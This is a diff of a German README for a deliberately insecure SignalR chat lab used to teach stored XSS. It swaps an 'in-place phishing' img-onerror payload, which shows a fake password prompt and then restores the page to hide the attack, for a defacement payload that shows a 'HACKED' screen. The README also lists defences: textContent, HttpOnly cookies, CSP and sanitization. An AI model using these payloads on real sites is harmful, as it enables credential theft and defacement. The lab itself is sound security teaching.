@@ -1,11 +1,11 @@
 # 🛡️ SignalR XSS & Security Lab
 
-Dieses Projekt ist eine absichtlich unsichere Chat-Anwendung. Sie dient als **Lernumgebung**, um Sicherheitslücken wie Cross-Site Scripting (XSS) und die Risiken von LocalStorage-basierten JWTs zu verstehen und zu beheben.
+Dieses Projekt ist eine absichtlich unsichere Chat-Anwendung. Sie dient als **Lernumgebung**, um Sicherheitslücken wie Cross-Site Scripting (XSS) und die Risiken von LocalStorage-basierten JWTs zu verstehen, zu demonstrieren und zu beheben.
 
 ## 🚀 Features
-* Echtzeit-Chat mit **SignalR** und ASP.NET Core.
-* Dynamisches Pastell-Design basierend auf dem Benutzernamen.
-* **Absichtliche Schwachstellen:** Demonstriert XSS durch die Verwendung von `innerHTML`.
+* **Echtzeit-Chat:** Kommunikation über **SignalR** und ASP.NET Core.
+* **Dynamisches Design:** Automatische Generierung von Pastell-Farben basierend auf dem Benutzernamen.
+* **Absichtliche Schwachstellen:** Demonstriert **Stored XSS** durch die Verwendung von `innerHTML` statt `textContent`.
 * **Dynamische Endpunkte:** Das Frontend nutzt relative Pfade, sodass kein Hardcoding von Ports nötig ist.
 
 ## 🛠️ Installation & Start
@@ -20,48 +20,35 @@ Dieses Projekt ist eine absichtlich unsichere Chat-Anwendung. Sie dient als **Le
 
 ---
 
-## ☣️ Das "In-Place Phishing" Experiment
+## ☣️ Das "Hacker-Defacement" Experiment
 
-Dieses Tutorial zeigt, wie ein Angreifer die komplette Kontrolle über das User-Interface übernehmen kann, ohne dass die URL in der Adresszeile sich ändert.
+Dieses Tutorial zeigt, wie ein Angreifer das komplette Aussehen der Webseite für alle Nutzer verändern kann ("Defacement"). Dies ist ein klassischer Weg, um Macht über eine Webpräsenz zu demonstrieren.
 
 ### Der Angriff:
-Kopiere diesen Payload in das Chat-Eingabefeld. Er simuliert eine abgelaufene Sitzung, greift das Passwort ab und stellt danach den Chat-Zustand wieder her, damit das Opfer keinen Verdacht schöpft.
+Kopiere diesen Payload in das Chat-Eingabefeld. Sobald andere Nutzer diese Nachricht empfangen, verwandelt sich ihr Chat-Fenster in einen "Hacked"-Screen mit Matrix-Vibe.
 
 ```html
 <img src=x onerror="
-    /* 1. Aktuellen Zustand der Seite speichern */
-    const originalContent = document.body.innerHTML;
-
-    /* 2. Den Phishing-Bildschirm erstellen */
+    /* Die Seite komplett schwarz machen und Hacker-Style erzwingen */
     document.body.innerHTML = `
-        <div id='phish' style='position:fixed;top:0;left:0;width:100%;height:100%;background:#f0f2f5;z-index:9999;display:flex;align-items:center;justify-content:center;font-family:Arial;'>
-            <div style='background:white;padding:40px;border-radius:15px;box-shadow:0 4px 20px rgba(0,0,0,0.2);text-align:center;width:350px;'>
-                <h2 style='color:#1e90ff;margin-bottom:20px;'>Sitzung abgelaufen</h2>
-                <p style='color:#666;margin-bottom:20px;'>Bitte geben Sie Ihr Passwort erneut ein, um fortzufahren.</p>
-                <input type='password' id='p' placeholder='Passwort' style='width:100%;padding:12px;margin-bottom:20px;border:2px solid #ddd;border-radius:25px;'>
-                <button id='btn' style='background:#1e90ff;color:white;border:none;padding:12px 30px;border-radius:25px;cursor:pointer;width:100%;'>Anmelden</button>
-            </div>
+        <div style='position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:#0f0;z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:monospace;text-shadow:0 0 5px #0f0;'>
+            <h1 style='font-size:50px;'>⚠️ SYSTEM CRITICAL ⚠️</h1>
+            <h2 style='font-size:30px;'>HACKED BY [DEIN NAME HIER]</h2>
+            <p style='font-size:18px;margin-top:20px;'>ACCESS DENIED. ALL DATA ENCRYPTED.</p>
+            <div id='matrix' style='margin-top:30px;font-size:12px;opacity:0.5;'></div>
+            <button onclick='location.reload()' style='margin-top:40px;background:transparent;border:1px solid #0f0;color:#0f0;padding:10px 20px;cursor:pointer;'>System neustarten?</button>
         </div>`;
-
-    /* 3. Event-Listener für den Button */
-    document.getElementById('btn').onclick = function() {
-        const pass = document.getElementById('p').value;
-        
-        /* 4. Passwort 'stehlen' (Demo-Zwecke) */
-        alert('ANGREIFER HAT DAS PASSWORT: ' + pass);
-        
-        /* 5. Alles wieder auf Anfang setzen - der User merkt nichts */
-        document.body.innerHTML = originalContent;
-        
-        /* 6. Seite neu laden, um Scripte/Verbindungen zu reaktivieren */
-        location.reload(); 
-    };
+    
+    /* Ein kleiner Matrix-Effekt im Hintergrund */
+    setInterval(() => {
+        document.getElementById('matrix').innerHTML += Math.random().toString(2).substring(2, 10) + ' ';
+    }, 100);
 ">
 ```
 
 ### 🔄 Notfall-Reset via Swagger
 
-Sollte ein Angriff die Website komplett unbrauchbar gemacht haben, kannst du das System jederzeit zurücksetzen. Da die Nachrichten direkt aus der Datenbank gerendert werden, löscht ein Reset der DB-Einträge auch den bösartigen Code:
+Sollte ein Angriff die Website komplett unbrauchbar gemacht haben, kannst du das System jederzeit zurücksetzen. Da die Nachrichten direkt aus der Datenbank geladen werden, löscht ein Reset der DB-Einträge auch den bösartigen Code:
 
 1.  Navigiere zu http://localhost:5001/swagger.
     
@@ -77,8 +64,13 @@ Sollte ein Angriff die Website komplett unbrauchbar gemacht haben, kannst du das
 
 In einer produktiven App sollten folgende Punkte umgesetzt werden:
 
-1.  **Kein innerHTML:** Verwende in script.js konsequent .textContent statt .innerHTML. Dies verhindert, dass der Browser User-Input als Code ausführt.
+*   **Kein innerHTML:** Verwende in script.js konsequent .textContent statt .innerHTML. Dies ist die wichtigste Verteidigung gegen XSS.
     
-2.  **HttpOnly Cookies:** Speichere JWTs niemals im localStorage. Nutze HttpOnly Cookies, damit JavaScript keinen Zugriff auf die Session-Token hat.
+*   **HttpOnly Cookies:** Speichere JWTs niemals im localStorage. Nutze **HttpOnly Cookies**, damit JavaScript keinen Zugriff auf die Session-Token hat.
     
-3.  **CSP (Content Security Policy):** Implementiere einen CSP-Header, der Inline-Skripte (onerror, ) blockiert.</div></li><li class="slate-li"><div style="position:relative"><strong class="slate-bold">Backend Sanitization:</strong> Nutze Bibliotheken wie Ganss.XSS im Backend, um eingehende Nachrichten zu filtern, bevor sie gespeichert werden.</div></li></ol><p class="slate-paragraph"><strong class="slate-bold">Warnung:</strong> Dieses Projekt dient nur zu Bildungszwecken. Führe diese Angriffe niemals auf Systemen aus, die dir nicht gehören.</p><p class="slate-paragraph"></p></x-turndown>
+*   **CSP (Content Security Policy):** Implementiere einen **CSP-Header**, der Inline-Skripte wie onerror blockiert.
+    
+*   **Backend Sanitization:** Nutze Bibliotheken wie **Ganss.XSS** im Backend, um Nachrichten zu filtern, bevor sie gespeichert werden.
+    
+
+> \[!WARNING\]**Warnung:** Dieses Projekt dient ausschließlich zu Bildungszwecken. Das Ausführen von XSS-Angriffen auf fremde Systeme ohne Erlaubnis ist illegal.
